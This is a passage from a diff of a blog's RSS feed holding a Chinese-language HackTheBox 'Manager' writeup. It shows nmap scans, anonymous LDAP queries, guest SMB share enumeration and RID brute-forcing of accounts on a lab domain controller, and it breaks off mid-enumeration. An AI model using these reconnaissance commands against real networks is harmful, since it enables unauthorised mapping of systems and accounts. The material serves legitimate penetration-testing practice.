@@ -1,4 +1,668 @@
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on Welcome My Hack's Blog</title><link>https://enilmalus.github.io/posts/</link><description>Recent content in Posts on Welcome My Hack's Blog</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Wed, 14 Oct 2026 14:00:00 +0800</lastBuildDate><atom:link href="https://enilmalus.github.io/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>HTB-Jeeves Writeup</title><link>https://enilmalus.github.io/posts/htb-jeeves-writeup/</link><pubDate>Wed, 14 Oct 2026 14:00:00 +0800</pubDate><guid>https://enilmalus.github.io/posts/htb-jeeves-writeup/</guid><description>Nmap 探测 使用 nmap 探测存活的端口。
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on Welcome My Hack's Blog</title><link>https://enilmalus.github.io/posts/</link><description>Recent content in Posts on Welcome My Hack's Blog</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Tue, 20 Oct 2026 14:00:00 +0800</lastBuildDate><atom:link href="https://enilmalus.github.io/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>HTB-Manager Writeup</title><link>https://enilmalus.github.io/posts/htb-manager-writeup/</link><pubDate>Tue, 20 Oct 2026 14:00:00 +0800</pubDate><guid>https://enilmalus.github.io/posts/htb-manager-writeup/</guid><description>Nmap 探测 使用 nmap 扫描开放的端口。
+┌──(kali㉿kali)-[~/Work/Kali/Manager] └─$ sudo nmap --min-rate 10000 -p- 10.129.55.226 -oA Nmap/ports [sudo] password for kali: Starting Nmap 7.98 ( https://nmap.org ) at 2026-10-15 02:52 -0400 Nmap scan report for 10.129.55.226 Host is up (0.16s latency). Not shown: 65514 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain 80/tcp open http 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 1433/tcp open ms-sql-s 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 5985/tcp open wsman 9389/tcp open adws 49667/tcp open unknown 49685/tcp open unknown 49686/tcp open unknown 49687/tcp open unknown 49724/tcp open unknown 49769/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 36.</description><content type="html"><![CDATA[<h2 id="nmap-探测">Nmap 探测</h2>
+<p>使用 nmap 扫描开放的端口。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Manager<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ sudo nmap --min-rate <span style="color:#ae81ff">10000</span> -p- 10.129.55.226 -oA Nmap/ports
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> kali:
+</span></span><span style="display:flex;"><span>Starting Nmap 7.98 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2026-10-15 02:52 -0400
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.55.226
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.16s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65514</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE
+</span></span><span style="display:flex;"><span>53/tcp    open  domain
+</span></span><span style="display:flex;"><span>80/tcp    open  http
+</span></span><span style="display:flex;"><span>88/tcp    open  kerberos-sec
+</span></span><span style="display:flex;"><span>135/tcp   open  msrpc
+</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn
+</span></span><span style="display:flex;"><span>389/tcp   open  ldap
+</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds
+</span></span><span style="display:flex;"><span>464/tcp   open  kpasswd5
+</span></span><span style="display:flex;"><span>593/tcp   open  http-rpc-epmap
+</span></span><span style="display:flex;"><span>636/tcp   open  ldapssl
+</span></span><span style="display:flex;"><span>1433/tcp  open  ms-sql-s
+</span></span><span style="display:flex;"><span>3268/tcp  open  globalcatLDAP
+</span></span><span style="display:flex;"><span>3269/tcp  open  globalcatLDAPssl
+</span></span><span style="display:flex;"><span>5985/tcp  open  wsman
+</span></span><span style="display:flex;"><span>9389/tcp  open  adws
+</span></span><span style="display:flex;"><span>49667/tcp open  unknown
+</span></span><span style="display:flex;"><span>49685/tcp open  unknown
+</span></span><span style="display:flex;"><span>49686/tcp open  unknown
+</span></span><span style="display:flex;"><span>49687/tcp open  unknown
+</span></span><span style="display:flex;"><span>49724/tcp open  unknown
+</span></span><span style="display:flex;"><span>49769/tcp open  unknown
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 36.05 seconds
+</span></span></code></pre></div><p>对开放的端口做详细信息扫描。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Manager<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ sudo nmap -sT -sC -sV -O -p 53,80,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,49667,49685,49686,49687,49724,49769 10.129.56.204
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> kali:
+</span></span><span style="display:flex;"><span>Starting Nmap 7.98 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2026-10-16 02:29 -0400
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.56.204
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.11s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT      STATE    SERVICE       VERSION
+</span></span><span style="display:flex;"><span>53/tcp    open     domain        Simple DNS Plus
+</span></span><span style="display:flex;"><span>80/tcp    open     http          Microsoft IIS httpd 10.0
+</span></span><span style="display:flex;"><span>| http-methods:
+</span></span><span style="display:flex;"><span>|_  Potentially risky methods: TRACE
+</span></span><span style="display:flex;"><span>|_http-title: Manager
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-IIS/10.0
+</span></span><span style="display:flex;"><span>88/tcp    open     kerberos-sec  Microsoft Windows Kerberos <span style="color:#f92672">(</span>server time: 2026-10-16 13:28:12Z<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>135/tcp   open     msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span style="display:flex;"><span>389/tcp   open     ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: manager.htb, Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_ssl-date: 2026-10-16T13:29:47+00:00; +6h59m00s from scanner time.
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject:
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: DNS:dc01.manager.htb
+</span></span><span style="display:flex;"><span>| Not valid before: 2024-08-30T17:08:51
+</span></span><span style="display:flex;"><span>|_Not valid after:  2122-07-27T10:31:04
+</span></span><span style="display:flex;"><span>445/tcp   open     microsoft-ds?
+</span></span><span style="display:flex;"><span>464/tcp   open     kpasswd5?
+</span></span><span style="display:flex;"><span>593/tcp   open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span style="display:flex;"><span>636/tcp   open     ssl/ldap      Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: manager.htb, Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject:
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: DNS:dc01.manager.htb
+</span></span><span style="display:flex;"><span>| Not valid before: 2024-08-30T17:08:51
+</span></span><span style="display:flex;"><span>|_Not valid after:  2122-07-27T10:31:04
+</span></span><span style="display:flex;"><span>|_ssl-date: 2026-10-16T13:29:47+00:00; +6h59m01s from scanner time.
+</span></span><span style="display:flex;"><span>1433/tcp  open     ms-sql-s      Microsoft SQL Server <span style="color:#ae81ff">2019</span> 15.00.2000.00; RTM
+</span></span><span style="display:flex;"><span>| ms-sql-info:
+</span></span><span style="display:flex;"><span>|   10.129.56.204:1433:
+</span></span><span style="display:flex;"><span>|     Version:
+</span></span><span style="display:flex;"><span>|       name: Microsoft SQL Server <span style="color:#ae81ff">2019</span> RTM
+</span></span><span style="display:flex;"><span>|       number: 15.00.2000.00
+</span></span><span style="display:flex;"><span>|       Product: Microsoft SQL Server <span style="color:#ae81ff">2019</span>
+</span></span><span style="display:flex;"><span>|       Service pack level: RTM
+</span></span><span style="display:flex;"><span>|       Post-SP patches applied: false
+</span></span><span style="display:flex;"><span>|_    TCP port: <span style="color:#ae81ff">1433</span>
+</span></span><span style="display:flex;"><span>|_ssl-date: 2026-10-16T13:29:47+00:00; +6h59m00s from scanner time.
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>SSL_Self_Signed_Fallback
+</span></span><span style="display:flex;"><span>| Not valid before: 2026-10-16T13:20:11
+</span></span><span style="display:flex;"><span>|_Not valid after:  2056-10-16T13:20:11
+</span></span><span style="display:flex;"><span>| ms-sql-ntlm-info:
+</span></span><span style="display:flex;"><span>|   10.129.56.204:1433:
+</span></span><span style="display:flex;"><span>|     Target_Name: MANAGER
+</span></span><span style="display:flex;"><span>|     NetBIOS_Domain_Name: MANAGER
+</span></span><span style="display:flex;"><span>|     NetBIOS_Computer_Name: DC01
+</span></span><span style="display:flex;"><span>|     DNS_Domain_Name: manager.htb
+</span></span><span style="display:flex;"><span>|     DNS_Computer_Name: dc01.manager.htb
+</span></span><span style="display:flex;"><span>|     DNS_Tree_Name: manager.htb
+</span></span><span style="display:flex;"><span>|_    Product_Version: 10.0.17763
+</span></span><span style="display:flex;"><span>3268/tcp  open     ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: manager.htb, Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_ssl-date: 2026-10-16T13:29:47+00:00; +6h59m00s from scanner time.
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject:
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: DNS:dc01.manager.htb
+</span></span><span style="display:flex;"><span>| Not valid before: 2024-08-30T17:08:51
+</span></span><span style="display:flex;"><span>|_Not valid after:  2122-07-27T10:31:04
+</span></span><span style="display:flex;"><span>3269/tcp  open     ssl/ldap      Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: manager.htb, Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject:
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: DNS:dc01.manager.htb
+</span></span><span style="display:flex;"><span>| Not valid before: 2024-08-30T17:08:51
+</span></span><span style="display:flex;"><span>|_Not valid after:  2122-07-27T10:31:04
+</span></span><span style="display:flex;"><span>|_ssl-date: 2026-10-16T13:29:47+00:00; +6h59m01s from scanner time.
+</span></span><span style="display:flex;"><span>5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: Not Found
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span style="display:flex;"><span>9389/tcp  open     mc-nmf        .NET Message Framing
+</span></span><span style="display:flex;"><span>49667/tcp open     msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49685/tcp open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span style="display:flex;"><span>49686/tcp open     msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49687/tcp filtered unknown
+</span></span><span style="display:flex;"><span>49724/tcp filtered unknown
+</span></span><span style="display:flex;"><span>49769/tcp open     unknown
+</span></span><span style="display:flex;"><span>Warning: OSScan results may be unreliable because we could not find at least <span style="color:#ae81ff">1</span> open and <span style="color:#ae81ff">1</span> closed port
+</span></span><span style="display:flex;"><span>Device type: general purpose
+</span></span><span style="display:flex;"><span>Running <span style="color:#f92672">(</span>JUST GUESSING<span style="color:#f92672">)</span>: Microsoft Windows 2019|<span style="color:#ae81ff">10</span> <span style="color:#f92672">(</span>97%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
+</span></span><span style="display:flex;"><span>Aggressive OS guesses: Windows Server <span style="color:#ae81ff">2019</span> <span style="color:#f92672">(</span>97%<span style="color:#f92672">)</span>, Microsoft Windows <span style="color:#ae81ff">10</span> <span style="color:#ae81ff">1903</span> - 21H1 <span style="color:#f92672">(</span>91%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>No exact OS matches <span style="color:#66d9ef">for</span> host <span style="color:#f92672">(</span>test conditions non-ideal<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host script results:
+</span></span><span style="display:flex;"><span>| smb2-time:
+</span></span><span style="display:flex;"><span>|   date: 2026-10-16T13:29:10
+</span></span><span style="display:flex;"><span>|_  start_date: N/A
+</span></span><span style="display:flex;"><span>| smb2-security-mode:
+</span></span><span style="display:flex;"><span>|   3.1.1:
+</span></span><span style="display:flex;"><span>|_    Message signing enabled and required
+</span></span><span style="display:flex;"><span>|_clock-skew: mean: 6h59m00s, deviation: 0s, median: 6h58m59s
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 104.51 seconds
+</span></span></code></pre></div><p>开放了 53、80、88、389、636、3268、1433、5985 端口，是一台域控。</p>
+<p>将暴露出来的域名解析至 hots。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Manager<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ tail -n <span style="color:#ae81ff">1</span> /etc/hosts
+</span></span><span style="display:flex;"><span>10.129.56.204 dc01.manager.htb manager.htb
+</span></span></code></pre></div><h2 id="web-渗透">Web 渗透</h2>
+<p>访问 80 端口，初步浏览没有发现特别值的注意的入口。</p>
+<p><img src="Pasted%20image%2020261016143739.png" alt=""></p>
+<p><img src="Pasted%20image%2020261016143912.png" alt=""></p>
+<p>同步一下时间，以免后续操作因为时间偏差报错。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Manager<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ sudo ntpdate 10.129.56.204
+</span></span><span style="display:flex;"><span>2026-10-16 09:46:05.047852 <span style="color:#f92672">(</span>-0400<span style="color:#f92672">)</span> +25140.365511 +/- 0.054899 10.129.56.204 s1 no-leap
+</span></span><span style="display:flex;"><span>CLOCK: time stepped by 25140.365511
+</span></span></code></pre></div><h2 id="域信息收集">域信息收集</h2>
+<p>用 ldapsearch 读 rootDSE，LDAP 规范要求匿名也可以访问它，如果返回成功则表明服务存活。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Manager<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ldapsearch -x -H ldap://10.129.56.204 -s base -b <span style="color:#e6db74">&#34;&#34;</span> <span style="color:#e6db74">&#34;(objectClass=*)&#34;</span> namingContexts defaultNamingContext
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># extended LDIF</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># LDAPv3</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># base &lt;&gt; with scope baseObject</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># filter: (objectClass=*)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># requesting: namingContexts defaultNamingContext</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
+</span></span><span style="display:flex;"><span>dn:
+</span></span><span style="display:flex;"><span>defaultNamingContext: DC<span style="color:#f92672">=</span>manager,DC<span style="color:#f92672">=</span>htb
+</span></span><span style="display:flex;"><span>namingContexts: DC<span style="color:#f92672">=</span>manager,DC<span style="color:#f92672">=</span>htb
+</span></span><span style="display:flex;"><span>namingContexts: CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span>manager,DC<span style="color:#f92672">=</span>htb
+</span></span><span style="display:flex;"><span>namingContexts: CN<span style="color:#f92672">=</span>Schema,CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span>manager,DC<span style="color:#f92672">=</span>htb
+</span></span><span style="display:flex;"><span>namingContexts: DC<span style="color:#f92672">=</span>DomainDnsZones,DC<span style="color:#f92672">=</span>manager,DC<span style="color:#f92672">=</span>htb
+</span></span><span style="display:flex;"><span>namingContexts: DC<span style="color:#f92672">=</span>ForestDnsZones,DC<span style="color:#f92672">=</span>manager,DC<span style="color:#f92672">=</span>htb
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># search result</span>
+</span></span><span style="display:flex;"><span>search: <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>result: <span style="color:#ae81ff">0</span> Success
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># numResponses: 2</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># numEntries: 1</span>
+</span></span></code></pre></div><p>进一步查询返回 Operator error，表明匿名身份可以读取 rootDES，但是不允许做子树搜索，放弃这条路。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Manager<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ldapsearch -x -H ldap://10.129.56.204 -s sub -b <span style="color:#e6db74">&#34;DC=manager,DC=htb&#34;</span>  <span style="color:#e6db74">&#34;(objectClass=user)&#34;</span>  sAMAccountName
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># extended LDIF</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># LDAPv3</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># base &lt;DC=manager,DC=htb&gt; with scope subtree</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># filter: (objectClass=user)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># requesting: sAMAccountName</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># search result</span>
+</span></span><span style="display:flex;"><span>search: <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>result: <span style="color:#ae81ff">1</span> Operations error
+</span></span><span style="display:flex;"><span>text: 000004DC: LdapErr: DSID-0C090CF4, comment: In order to perform this opera
+</span></span><span style="display:flex;"><span> tion a successful bind must be completed on the connection., data 0, v4563
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># numResponses: 1</span>
+</span></span></code></pre></div><h2 id="smb-探索">SMB 探索</h2>
+<p>尝试匿名访问 smb 失败，但是以 guest 身份访问列举出来了共享。</p>
+<p>没有自定义共享。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Manager<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nxc smb 10.129.56.204 -u <span style="color:#e6db74">&#39;&#39;</span> -p <span style="color:#e6db74">&#39;&#39;</span> --shares
+</span></span><span style="display:flex;"><span>SMB         10.129.56.204   <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> / Server <span style="color:#ae81ff">2019</span> Build <span style="color:#ae81ff">17763</span> x64 <span style="color:#f92672">(</span>name:DC01<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:manager.htb<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:None<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>Null Auth:True<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.56.204   <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> manager.htb<span style="color:#ae81ff">\:</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.56.204   <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Error enumerating shares: STATUS_ACCESS_DENIED
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Manager<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nxc smb 10.129.56.204 -u <span style="color:#e6db74">&#39;enil&#39;</span> -p <span style="color:#e6db74">&#39;&#39;</span> --shares
+</span></span><span style="display:flex;"><span>SMB         10.129.56.204   <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> / Server <span style="color:#ae81ff">2019</span> Build <span style="color:#ae81ff">17763</span> x64 <span style="color:#f92672">(</span>name:DC01<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:manager.htb<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:None<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>Null Auth:True<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.56.204   <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> manager.htb<span style="color:#ae81ff">\e</span>nil: <span style="color:#f92672">(</span>Guest<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.56.204   <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Enumerated shares
+</span></span><span style="display:flex;"><span>SMB         10.129.56.204   <span style="color:#ae81ff">445</span>    DC01             Share           Permissions     Remark
+</span></span><span style="display:flex;"><span>SMB         10.129.56.204   <span style="color:#ae81ff">445</span>    DC01             -----           -----------     ------
+</span></span><span style="display:flex;"><span>SMB         10.129.56.204   <span style="color:#ae81ff">445</span>    DC01             ADMIN$                          Remote Admin
+</span></span><span style="display:flex;"><span>SMB         10.129.56.204   <span style="color:#ae81ff">445</span>    DC01             C$                              Default share
+</span></span><span style="display:flex;"><span>SMB         10.129.56.204   <span style="color:#ae81ff">445</span>    DC01             IPC$            READ            Remote IPC
+</span></span><span style="display:flex;"><span>SMB         10.129.56.204   <span style="color:#ae81ff">445</span>    DC01             NETLOGON                        Logon server share
+</span></span><span style="display:flex;"><span>SMB         10.129.56.204   <span style="color:#ae81ff">445</span>    DC01             SYSVOL                          Logon server share
+</span></span></code></pre></div><p>RID 递推的做法是拿一个编号去问这个 SID 对应谁，逐个数着问。它走的是 SMB 上的 RPC，与 LDAP 是两套独立的权限模型，所以 LDAP 匿名被拒并不影响它。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Manager<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nxc smb 10.129.56.204 -u <span style="color:#e6db74">&#39;enil&#39;</span> -p <span style="color:#e6db74">&#39;&#39;</span> --rid-brute <span style="color:#ae81ff">5000</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.56.204   <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> / Server <span style="color:#ae81ff">2019</span> Build <span style="color:#ae81ff">17763</span> x64 <span style="color:#f92672">(</span>name:DC01<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:manager.htb<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:None<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>Null Auth:True<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.56.204   <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> manager.htb<span style="color:#ae81ff">\e</span>nil: <span style="color:#f92672">(</span>Guest<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.56.204   <span style="color:#ae81ff">445</span>    DC01             498: MANAGER<span style="color:#ae81ff">\E</span>nterprise Read-only Domain Controllers <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.56.204   <span style="color:#ae81ff">445</span>    DC01             500: MANAGER<span style="color:#ae81ff">\A</span>dministrator <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.56.204   <span style="color:#ae81ff">445</span>    DC01             501: MANAGER<span style="color:#ae81ff">\G</span>uest <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.56.204   <span style="color:#ae81ff">445</span>    DC01             502: MANAGER<span style="color:#ae81ff">\k</span>rbtgt <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.56.204   <span style="color:#ae81ff">445</span>    DC01             512: MANAGER<span style="color:#ae81ff">\D</span>omain Admins <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.56.204   <span style="color:#ae81ff">445</span>    DC01             513: MANAGER<span style="color:#ae81ff">\D</span>omain Users <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.56.204   <span style="color:#ae81ff">445</span>    DC01             514: MANAGER<span style="color:#ae81ff">\D</span>omain Guests <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.56.204   <span style="color:#ae81ff">445</span>    DC01             515: MANAGER<span style="color:#ae81ff">\D</span>omain Computers <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.56.204   <span style="color:#ae81ff">445</span>    DC01             516: MANAGER<span style="color:#ae81ff">\D</span>omain Controllers <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
